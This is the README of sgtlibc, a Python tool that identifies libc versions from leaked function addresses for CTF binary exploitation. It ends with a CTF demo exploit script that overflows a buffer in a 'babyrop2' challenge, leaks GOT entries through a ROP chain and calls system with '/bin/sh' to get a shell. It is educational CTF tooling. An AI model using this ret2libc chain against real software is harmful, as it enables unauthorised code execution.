

<p align="center">
    <a href="https://github.com/serfend/sgtlibc/"><img alt="pypi version" src="https://visitor-badge.glitch.me/badge?page_id=serfend/sgtlibc&left_text=views" /></a> 
    <a href="https://pypi.python.org/pypi/sgtlibc/"><img alt="pypi version" src="https://img.shields.io/pypi/v/sgtlibc.svg" /></a> 
    <a href="https://pypistats.org/packages/sgtlibc"><img alt="pypi download" src="https://img.shields.io/pypi/dm/sgtlibc.svg" /></a>
    <a href="https://github.com/serfend/sgtlibc/releases"><img alt="GitHub release" src="https://img.shields.io/github/release/serfend/sgtlibc.svg?style=flat-square" /></a>
    <a href="https://github.com/serfend/sgtlibc/releases"><img alt="GitHub All Releases" src="https://img.shields.io/github/downloads/serfend/sgtlibc/total.svg?style=flat-square&color=%2364ff82" /></a>
    <a href="https://github.com/serfend/sgtlibc/commits"><img alt="GitHub last commit" src="https://img.shields.io/github/last-commit/serfend/sgtlibc.svg?style=flat-square" /></a>
    <!-- <a href="https://github.com/serfend/sgtlibc/actions/workflows/pytest.yml"><img alt="GitHub Workflow Status" src="https://github.com/serfend/sgtlibc/actions/workflows/pytest.yml/badge.svg" /></a> -->
</p>





![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)![Ubuntu](https://img.shields.io/badge/Ubuntu-E95420?style=for-the-badge&logo=ubuntu&logoColor=white)![Kali](https://img.shields.io/badge/Kali-268BEE?style=for-the-badge&logo=kalilinux&logoColor=white)![FreeBSD](https://img.shields.io/badge/-FreeBSD-%23870000?style=for-the-badge&logo=freebsd&logoColor=white)![Deepin](https://img.shields.io/badge/Deepin-007CFF?style=for-the-badge&logo=deepin&logoColor=white)![Debian](https://img.shields.io/badge/Debian-D70A53?style=for-the-badge&logo=debian&logoColor=white)![Cent OS](https://img.shields.io/badge/cent%20os-002260?style=for-the-badge&logo=centos&logoColor=F0F0F0)

# What?

[sgtlibc](https://github.com/serfend/sgtlibc) is a a offline python-lib for search libc function.



## Install

```shell
pip install sgtlibc
```



## Usage

```shell
usage: sgtlibc [-h] [-d [DUMP ...]] [-i [INDEX]] [-s [SYMBOLS]] [-u [UPDATE]] [-v [VERSION]] [funcs_with_addresses]

a offline python-lib for search libc function.for search version of libc.you can use like:`sgtlibc puts:aa0+read:140 --dump system binsh` or in python , like : `py:import sgtlibc;s =
sgtlibc.LibcSearcher();s.add_condition('puts',0xaa0)`

positional arguments:
  funcs_with_addresses  specify `func-name` and `func address` , split by `|`,eg: puts:aa0+read:140 , its means func-puts address = 0xaa0;func-read address = 0x140 (default: None).

options:
  -h, --help            show this help message and exit
  -d [DUMP ...], --dump [DUMP ...]
                        select funcs to dump its info (default: ['__libc_start_main_ret', 'system', 'dup2', 'read', 'write', 'str_bin_sh']).
  -i [INDEX], --index [INDEX]
                        db index on multi-database found occation (default: 0).
  -s [SYMBOLS], --symbols [SYMBOLS]
                        convert libc-elf file to symbols-file,use `libc_path [alias]` to convert.
  -u [UPDATE], --update [UPDATE]
                        update current libc database from internet , need non-microsoft-windows environment (default: False).
  -v [VERSION], --version [VERSION]
                        show version
```





## Quick Start

- in cmd.exe` or `/bin/sh`

```shell
sgtlibc puts:aa0
sgtlibc puts:aa0+read:140
sgtlibc puts:aa0+read:140 --dump system binsh
```

- in `python3`

```python
import sgtlibc
s = sgtlibc.Searcher()
s.add_condition('puts', 0xaa0)
s.add_condition('read',0x140)
print(s.dump())
print(s.dump(['system','str_bin_sh']))
```



## Example

- `main args` specify `func-name` and `func address` ,**SHOULD split by `|` **

  eg: `puts:aa0+read:140` which means:

  - func-`puts` address = `0xaa0`
  - func-`read` address =` 0x140`

- `--update` is for update libc database from internet base on `libc-database` , **require non-microsoft-window**  system

### python run

- run [python code above](/#/Quick Start) , you'll get output-result like following shows:

![image-20220605212842313](https://raw.githubusercontent.com/serfend/res.image.reference/main/image-20220605212842313.png)

### command run

- run command in terminal , you'll get output-result like following shows:

  ![image-20220605213023151](https://raw.githubusercontent.com/serfend/res.image.reference/main/image-20220605213023151.png)

### pwntools run

- use in `pwntools`

```python
from pwn import * # should run pip install pwntools before
import sgtlibc
s = libc.Searcher()
puts_addr = 0xf71234567aa0 # from leak data
s.add_condition('puts',puts_addr)
s.dump(db_index=0) # search libc , if returns multi-result ,default use index-0's result
system_addr = p00(s.get_address(sgtlibc.s_system))
binsh_addr = p00(s.get_address(sgtlibc.s_binsh))
```



### use user-libc database

> search libc from user-directory

```python
from sgtlibc.utils import configuration as config
def test_use_user_libc():
    lib_path = './libs' # here input your libc directory
    config.set(config.extension_database_path, lib_path)
    s = LibcSearcher('puts', 0xf7007)
    s.decided()
```



### add user-libc database

> add a libc.so file to database

```bash
sgtlibc -s ./libc.from_user.so:alias_input_here
```

or

```python
from sgtlibc.main import do_symbols
do_symbols(f'./libc.from_user.so:alias_input_here')
```

## CTF Problem Solve DEMO

[view all sameple files](https://github.com/serfend/sgtlibc/tree/main/samples/libc-leak/x64-babyrop)

- use exploit code

```python
import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=True, file='./babyrop2', remote='192.168.0.1:25462',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf
def exp():
	payload_exp = [b'a' * (28 + 4),fakeebp()] # overflow position
    return payload_exp
def leak(func: str):
    payload = exp()
    # here will auto-pack to p64, you can use p64 or p00 as same effect.
    payload += [elf.rop['rdi'],elf.got[func],elf.plt['printf'],elf.symbols['main']]
    sl(payload)
    rl()
    data = rc(6).ljust(8, b'\0')
    data = uc(data)
    s.add_condition(func, data)
    return data
leak('printf')
leak('read')
data = s.dump(db_index=2)  # choose your system index
system_addr = s.get_address(sgtlibc.s_system)
binsh_addr = s.get_address(sgtlibc.s_binsh)
log.info(f'system_addr:{hex(system_addr)}')
log.info(f'binsh_addr:{hex(binsh_addr)}')
payload = exp() 
payload += [elf.rop['rdi'],binsh_addr,system_addr, fakeebp()]
    
sl(payload)
interactive()
```

- result

![image-20220609134743902](https://raw.githubusercontent.com/serfend/res.image.reference/main/image-20220609134743902.png)





## Notice

> default libc database is update on `2022-06-01`,which long-time ago , we fully recommanded to update it by run `sgtlibc --update`



## Status

![Alt](https://repobeats.axiom.co/api/embed/7d8920fddffed00ee7feb8d172bc7b48c86da3b8.svg "Repobeats analytics image")
